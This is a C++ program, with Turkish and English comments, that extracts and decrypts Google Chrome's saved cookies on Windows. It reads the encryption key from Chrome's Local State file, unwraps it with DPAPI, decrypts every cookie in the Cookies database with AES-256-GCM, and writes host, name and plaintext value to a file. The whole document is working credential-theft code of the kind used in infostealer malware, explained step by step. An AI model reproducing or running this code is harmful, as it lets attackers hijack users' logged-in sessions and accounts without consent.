/*
COOKIES THAT SAVED BY CHROME ARE ENCRYPTED WITH AES-256 GCM METHOD.
1-) Find your key that we're using it for decrpyting cookie, it generally can be found at specific path, this key is uniqie
for all users. After finding the key, we have to decrypt it but dont worry, just decode it in base64 then remove the DPAPI part (DPAPÝ
has been written in first 5 bytes). Lastly unprotect the key(you dont have to know what this part does exactly just use the func).

2-) Save your encrypted cookie in hex format and start splitting it. first 3 bytes are useless its constant and shows version.
Between 3-15 bytes are called no once number. From 15 to before last 16 called ciphertext, last 16 bytes called tag. Now if you know
the logic of AES-256 GCM method; use key, ciphertext and tag to decrypt this encrypted cookie.
*/

//Do not forget to add Crypt32.lib to linker->additional depencies
#pragma once
#pragma warning(disable : 4996)
#define _CRT_SECURE_NO_DEPRECATE 1
#define CRYPTOPP_DEFAULT_NO_DLL 1
#define CRYPTOPP_ENABLE_NAMESPACE_WEAK 1

#ifdef _DEBUG

#ifndef x64
#pragma comment(lib, "./CryptoPP/Output/Debug/cryptlib.lib")
#endif

#else
#pragma comment(lib, "./CryptoPP/Output/Release/cryptlib.lib")
#endif


#include "CryptoPP/pch.h"
#include "CryptoPP/files.h"
#include "CryptoPP/base64.h"
#include "CryptoPP/osrng.h"
#include "CryptoPP/gcm.h"
#include <iostream>
#include <string>
#include <bitset>
#include <windows.h> 
#include "sqlite.h"
#include <codecvt>

USING_NAMESPACE(CryptoPP)
USING_NAMESPACE(std)
#define CRYPTOGRAPHIC_KEY_LENGTH			1024
#define SALT_BYTE_LENGTH					41
#define MAC_SIZE							16



//okudugumuz cookinin 3. columndaki encrtpyted degeri blob olarak okuduk ve bu fonk ile onu vector'e ceviriyoruz.
std::vector<uint8_t> blobToVector(const void* blobData, int length) {
	return std::vector<uint8_t>(static_cast<const uint8_t*>(blobData), static_cast<const uint8_t*>(blobData) + length);
}
//AES-256 GCM modu ile þifreli veriyi decrypt etmek icin fonksiyon.
std::vector<uint8_t> decrypt_aes_gcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce, const std::vector<uint8_t>& ciphertext, const std::vector<uint8_t>& tag)
{
	const size_t ivLength = 12; // AES-GCM için IV uzunluðu

	if (nonce.size() != ivLength) {
		throw std::runtime_error("Invalid nonce size");
	}

	std::vector<uint8_t> decrypted_data(ciphertext.size());

	try {
		CryptoPP::GCM<CryptoPP::AES>::Decryption decryptor;
		decryptor.SetKeyWithIV(key.data(), key.size(), nonce.data(), nonce.size());

		CryptoPP::AuthenticatedDecryptionFilter df(decryptor,
			new CryptoPP::ArraySink(decrypted_data.data(), decrypted_data.size()),
			CryptoPP::AuthenticatedDecryptionFilter::DEFAULT_FLAGS, tag.size());

		df.ChannelPut(CryptoPP::AAD_CHANNEL, nullptr, 0); // No AAD
		df.ChannelPut(CryptoPP::DEFAULT_CHANNEL, ciphertext.data(), ciphertext.size());
		df.ChannelPut(CryptoPP::DEFAULT_CHANNEL, tag.data(), tag.size());

		df.ChannelMessageEnd(CryptoPP::DEFAULT_CHANNEL);

		if (!df.GetLastResult()) {
			throw std::runtime_error("Decryption failed");
		}
	}
	catch (const CryptoPP::Exception& e) {
		throw std::runtime_error(e.what());
	}

	return decrypted_data;
}

std::vector<BYTE> UnprotectData(const std::vector<BYTE>& encrypted_key) {
	DATA_BLOB inputBlob = { static_cast<DWORD>(encrypted_key.size()), const_cast<BYTE*>(encrypted_key.data()) };
	DATA_BLOB outputBlob = { 0, NULL };

	if (!CryptUnprotectData(&inputBlob, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &outputBlob)) {
		throw std::runtime_error("DPAPI decryption failed.");
	}

	std::vector<BYTE> decrypted_key(outputBlob.pbData, outputBlob.pbData + outputBlob.cbData);
	LocalFree(outputBlob.pbData);

	return decrypted_key;
}
std::vector<BYTE> Base64Decode2(const std::string& input) {
	DWORD length = 0;
	if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &length, NULL, NULL)) {
		throw std::runtime_error("Base64 decoding failed.");
	}

	std::vector<BYTE> output(length);
	if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, output.data(), &length, NULL, NULL)) {
		throw std::runtime_error("Base64 decoding failed.");
	}

	return output;
}
std::string ExtractEncryptedKey(const std::string& jsonString) {
	std::string keyPrefix = "\"encrypted_key\":\"";
	size_t startPos = jsonString.find(keyPrefix);
	if (startPos == std::string::npos) {
		throw std::runtime_error("Encrypted key not found.");
	}
	startPos += keyPrefix.length();
	size_t endPos = jsonString.find("\"", startPos);
	if (endPos == std::string::npos) {
		throw std::runtime_error("Invalid JSON format.");
	}
	return jsonString.substr(startPos, endPos - startPos);
}

std::string getstring(std::vector<uint8_t> data, const std::vector<uint8_t>& key)
{
	std::vector<uint8_t> nonce(data.begin() + 3, data.begin() + 3 + 12);
	std::vector<uint8_t> ciphertext(data.begin() + 3 + 12, data.end() - 16);
	std::vector<uint8_t> tag(data.end() - 16, data.end());

	std::vector<uint8_t> plaintext = decrypt_aes_gcm(key, nonce, ciphertext, tag);
	std::string decrypted_string(plaintext.begin(), plaintext.end());
	return decrypted_string;
}

int main()
{
	std::string fpath = "Cookies";
	std::string path = getenv("LOCALAPPDATA");
	path += "\\Google\\Chrome\\User Data\\Local State"; //decryption key'imizin sakli oldugu mekan

	std::ifstream file(path);
	if (!file.is_open()) {
		std::cerr << "Failed to open file: " << path << std::endl;
		return 1;
	}
	std::string jsonData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
	file.close();

	std::string encrypted_key_base64 = ExtractEncryptedKey(jsonData);

	auto encrypted_key = Base64Decode2(encrypted_key_base64); //base64decode islemi yap
	encrypted_key.erase(encrypted_key.begin(), encrypted_key.begin() + 5); //basindaki DPAPÝ'yi kaldir
	auto decrypted_key = UnprotectData(encrypted_key); //decrypt et

	sqlite3* db;
	sqlite3_stmt* stmt;
	std::string path2 = getenv("LOCALAPPDATA"); //okunacak e-cookinin yer aldigi mekan
	path2 += "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
	const char* cookiepath = path2.c_str();

	if (sqlite3_open(cookiepath, &db) == SQLITE_OK) {
		const char* sql = "SELECT host_key, name, value, encrypted_value FROM cookies";

		if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
			std::ofstream cookie_file(fpath);

			while (sqlite3_step(stmt) == SQLITE_ROW) {
				std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
				std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));

				const void* encryptedvalue = sqlite3_column_blob(stmt, 3);
				int encryptedvalueSize = sqlite3_column_bytes(stmt, 3);

				if (encryptedvalue != nullptr && encryptedvalueSize != 0) //eger evalue bos degil ise
				{
					std::vector<uint8_t> data = blobToVector(encryptedvalue, encryptedvalueSize); //blob turunde okudugumuz evalue'yi uint8_t turune donusturuyoruz
					cookie_file << "H:" << host << ",N:" << name << ",EV:" << getstring(data, decrypted_key) << std::endl;
				}

			}
			cookie_file.close();
			sqlite3_finalize(stmt);
		}
		sqlite3_close(db);
	}
	else {
		//std::cerr << "hata, cookie dosyasi okunamadi" << std::endl;
	}
}


